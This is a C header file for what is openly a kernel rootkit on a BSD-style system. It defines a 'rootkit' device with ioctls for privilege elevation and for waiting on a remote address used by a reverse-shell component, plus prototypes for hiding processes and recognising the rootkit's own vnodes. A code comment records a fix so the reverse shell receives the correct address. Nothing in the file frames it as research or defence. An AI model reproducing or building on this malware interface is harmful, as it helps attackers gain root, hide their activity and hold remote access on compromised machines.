#ifndef INTERFACE_H
#define INTERFACE_H

#include <sys/ioccom.h>

struct vnode;
#include <netinet/in.h>

#define rootkit_DEV_NAME "rootkit"

/* ioctl definitions for privilege elevation and remote wait */
#define rootkit_ELEVATE            _IO('r', 0x01)
#define rootkit_IOCTL_ELEVATE      rootkit_ELEVATE

/*
 * _IOWR, not _IOW: sys_ioctl() only copies the data buffer back to userland
 * when the command carries IOC_OUT (sys_generic.c: if (com & IOC_OUT)
 * copyout(...)). With plain _IOW the reply address was written into a kernel
 * copy of the argument that nobody ever read, so revshell always came back
 * with 0.0.0.0.
 */
#define rootkit_WAIT_REMOTE        _IOWR('r', 0x02, struct in_addr)
#define rootkit_IOCTL_WAIT_REMOTE  rootkit_WAIT_REMOTE

int make_rootkit_dev(void);
void destroy_rootkit_dev(void);
void hide_process_syscall(void);
int rootkit_is_our_vnode(struct vnode *vp);

#endif
